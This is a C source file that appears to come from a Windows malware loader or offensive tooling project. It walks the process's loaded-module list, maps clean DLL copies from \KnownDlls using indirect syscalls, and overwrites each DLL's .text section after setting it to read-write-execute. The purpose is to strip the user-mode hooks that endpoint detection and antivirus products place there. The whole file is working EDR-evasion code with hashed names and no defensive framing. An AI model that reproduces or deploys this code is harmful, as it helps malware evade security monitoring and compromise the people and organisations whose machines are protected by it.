#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

extern NT_API g_Nt; // Defined in main.c


LPVOID MapDllFromKnownDllDir(IN PWSTR szDllName) {

	PVOID				pModule			= NULL;
	HANDLE				hSection		= INVALID_HANDLE_VALUE;
	UNICODE_STRING		UniString		= { 0 };
	OBJECT_ATTRIBUTES	ObjectiveAttr	= { 0 };
	SIZE_T				sViewSize		= NULL;
	NTSTATUS			STATUS			= 0x00;
	WCHAR				wFullDllPath [MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

	// Construct the dll's path in the knowndlls dir
	Wcscat(wFullDllPath, szDllName);

	// Construct a unicode string array containg the string created earlier
	UniString.Buffer = (PWSTR)wFullDllPath;
	UniString.Length = UniString.MaximumLength = wcslen(wFullDllPath) * sizeof(WCHAR);

	// Create the object attribute structure required for the NtOpenSection syscall
	InitializeObjectAttributes(&ObjectiveAttr, &UniString, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// Open a section to the knowndll dll
	SET_SYSCALL(g_Nt.NtOpenSection);
	if (!NT_SUCCESS(STATUS = RunSyscall(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectiveAttr))) {
#ifdef DEBUG
		PRINT("\t[!] NtOpenSection Failed Openning \"%ws\" With Error: 0x%0.8X - %s.%d [%s]\n", wFullDllPath, STATUS, GET_FILENAME(__FILE__), __LINE__, STATUS == STATUS_OBJECT_NAME_NOT_FOUND ? "IT'S OK" : "BAD !");
#endif
		return NULL;
	}

	// Map the section into the local process
	SET_SYSCALL(g_Nt.NtMapViewOfSection);
	if (!NT_SUCCESS(STATUS = RunSyscall(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READONLY))) {
#ifdef DEBUG
		PRINT("\t[!] NtMapViewOfSection Failed Mapping \"%ws\" With Error: 0x%0.8X - %s.%d \n", wFullDllPath, STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
		return NULL;
	}

	return pModule;
}

//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

VOID UnhookAllLoadedDlls()
{

	NTSTATUS		STATUS		= 0x00;
	PPEB			pPeb		= (PPEB)__readgsqword(0x60);
	PLIST_ENTRY		pHeadEntry	= &pPeb->LoaderData->InMemoryOrderModuleList,
					pNextEntry	= pHeadEntry->Flink;

	if (!g_Nt.bInit) {
		return;
	}

	// skip the local .exe image
	pNextEntry = pNextEntry->Flink;

	// loop through all the loaded dlls
	while (pNextEntry != pHeadEntry) {

		// Getting the dll's name
		PLDR_DATA_TABLE_ENTRY	pLdrDataTblEntry	= (PLDR_DATA_TABLE_ENTRY)((PBYTE)pNextEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		PUNICODE_STRING			pUnicodeDllName		= (PUNICODE_STRING)((PBYTE)&pLdrDataTblEntry->FullDllName + sizeof(UNICODE_STRING));
		// Getting the dll's local base address & load the unhooked version from \KnownDlls\ dir
		LPVOID					pKnownDllCopy		= MapDllFromKnownDllDir(pUnicodeDllName->Buffer),
								pLocalDllCopy		= (LPVOID)(pLdrDataTblEntry->DllBase);

		SIZE_T					sTextSectionSize				= NULL;
		LPVOID					pLocalTxtSectionAddress			= NULL,
								pKnownDllTxtSectionAddress		= NULL;
		DWORD					dwOldProtection					= 0x00;


		// If both pointers are retrieved
		if (pKnownDllCopy && pLocalDllCopy) {

			// Fetch the nt headrs
			PIMAGE_NT_HEADERS		pLocalImgNtHdrs				= (PIMAGE_NT_HEADERS)((ULONG_PTR)pLocalDllCopy + ((PIMAGE_DOS_HEADER)pLocalDllCopy)->e_lfanew);
			if (pLocalImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
				goto _CLEANUP;

			PIMAGE_SECTION_HEADER	pLocalImgSecHdr				= IMAGE_FIRST_SECTION(pLocalImgNtHdrs);

#ifdef DEBUG
			PRINT("[i] Unhooking %ws ...", pUnicodeDllName->Buffer);
#endif

			// Search for the .text section in the local dll
			for (int i = 0; i < pLocalImgNtHdrs->FileHeader.NumberOfSections; i++) {
			
				if (DJB2HASH(pLocalImgSecHdr[i].Name) == text_DJB2) {

					sTextSectionSize			= pLocalImgSecHdr[i].Misc.VirtualSize;
					pLocalTxtSectionAddress		= (LPVOID)((ULONG_PTR)pLocalDllCopy + pLocalImgSecHdr[i].VirtualAddress);
					pKnownDllTxtSectionAddress	= (LPVOID)((ULONG_PTR)pKnownDllCopy + pLocalImgSecHdr[i].VirtualAddress);
					break;
				}
			}

			// Check if all variables are retrieved
			if (!sTextSectionSize || !pLocalTxtSectionAddress || !pKnownDllTxtSectionAddress)
				goto _CLEANUP;

			// Change memory permissions to RWX, to allow overwriting 
			SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
			if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, PAGE_EXECUTE_READWRITE, &dwOldProtection))) {
#ifdef DEBUG
				PRINT("\t[!] NtProtectVirtualMemory[1] Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
				goto _CLEANUP;
			}

			// Overwriting the hooked .text section with the fresh one
			Memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);
			
			// Reset the memory permessions to original
			SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
			if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, dwOldProtection, &dwOldProtection))) {
#ifdef DEBUG
				PRINT("\t[!] NtProtectVirtualMemory[2] Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
				goto _CLEANUP;
			}

#ifdef DEBUG
			PRINT("[+] DONE \n");
#endif 

		}

_CLEANUP:
		// Move to the next dll
		pNextEntry = pNextEntry->Flink;
		// Unmap the \knowndlls\ dll if found mapped
		if (pKnownDllCopy) {
			SET_SYSCALL(g_Nt.NtUnmapViewOfSection);
			if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), pKnownDllCopy))) {
#ifdef DEBUG
				PRINT("\t[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
			}
		}
	}


}
